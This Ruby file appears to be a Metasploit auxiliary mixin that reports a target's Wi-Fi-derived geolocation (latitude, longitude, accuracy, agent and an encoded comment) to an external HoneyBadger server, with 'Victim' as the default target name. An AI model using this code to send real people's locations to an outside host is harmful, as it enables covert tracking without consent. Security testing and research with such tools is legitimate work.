module Msf

	module Auxiliary::Badger_Report

        require 'net/https'
        require 'net/http'
        require 'rex/proto/http/client'

        
    def initialize(info = {})
		super
		
		register_options(
			[
                         
            # badger server honeybadger.lanmaster53.com
            # badger uri    uri
			OptString.new('BADGER_TGT',   [ true, "Badger Target", "Victim" ]),
			OptString.new('BADGER_URI',   [ true, "Bager Reporting Page", "http://honeybadger.lanmaster53.com/service.php"]),
			], self.class
			)
	end

	class Wlan_net
		def initialize(ssid,mac,rssi)
			@ssid=ssid
			@mac=mac
			@rssi=rssi
		end
		def ssid
			@ssid
		end
		def mac
			@mac
		end
		def rssi
			@rssi
		end
	end

	class Position
		def initialize(lat,lon,acc)
			@lat=lat
			@lon=lon
			@acc=acc
		end
		def lat
			@lat
		end
		def lon
			@lon
		end
		def acc
			@acc
		end
	end
    
    def return_uri
        uri = URI("#{datastore['BADGER_URI']}")
        return uri
    end
        
    def report_results(pos,agent,comment=nil)
        
        uri = URI("#{datastore['BADGER_URI']}")
        port = uri.port
        host = uri.host
        path = uri.path
        ssl = false
        if uri.scheme == "https"
            ssl = true
        end
        c = Rex::Proto::Http::Client.new(host,port,{},ssl)
        path << "?target=#{datastore['BADGER_TGT']}&agent=#{agent}"
        if (pos.acc)
            path << "&lat=#{pos.lat}&lng=#{pos.lon}&acc=#{pos.acc}"
        end
        if (comment!=nil)
            b64_comment = Rex::Text.encode_base64(comment)
            path << "&comment=#{b64_comment}"
        end
        r = c.request_raw('uri'=>path)
        resp=c.send_recv(r)
        if resp.code == 200
            print_status("Badger report sent to: #{datastore['BADGER_URI']}")
        else
            print_status("Badger report failed to: #{datastore['BADGER_URI']}")
        end
    end

        
	end
end
